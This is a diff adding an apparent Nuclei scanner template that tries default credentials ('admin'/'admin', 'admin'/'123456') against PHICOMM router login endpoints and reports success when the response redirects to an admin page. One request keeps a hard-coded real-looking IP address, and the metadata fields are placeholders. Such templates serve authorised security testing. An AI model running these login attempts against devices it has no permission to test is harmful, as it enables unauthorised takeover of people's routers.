@@ -1,0 +1,56 @@
+id: PHICOMM-router-default-login
+info:
+  name: PHICOMM-router-default-login
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /goform/formLogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 100
+        Origin: http://{{Hostname}}
+        Connection: close
+        Referer: http://{{Hostname}}/login.asp
+        Upgrade-Insecure-Requests: 1
+
+        Language=Chinese&username=admin&Language_set=Chinese&password=YWRtaW4%3D&login=%E7%99%BB+++%E5%BD%95
+      - |-
+        POST /cgi-bin/luci/admin/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 113
+        Origin: http://171.125.13.173:3006
+        Connection: close
+        Referer: http://171.125.13.173:3006/cgi-bin/luci
+        Upgrade-Insecure-Requests: 1
+
+        action_mode=apply&action_url=http%3A%2F%2F{{Hostname}}%2Fcgi-bin%2Fluci&username=admin&password={{password}}
+    attack: pitchfork
+    payloads:
+      password:
+        - 'YWRtaW4%3D'
+        - 'MTIzNDU2'        
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - /index.asp
+      - type: word
+        part: header
+        words:
+          - /admin/index
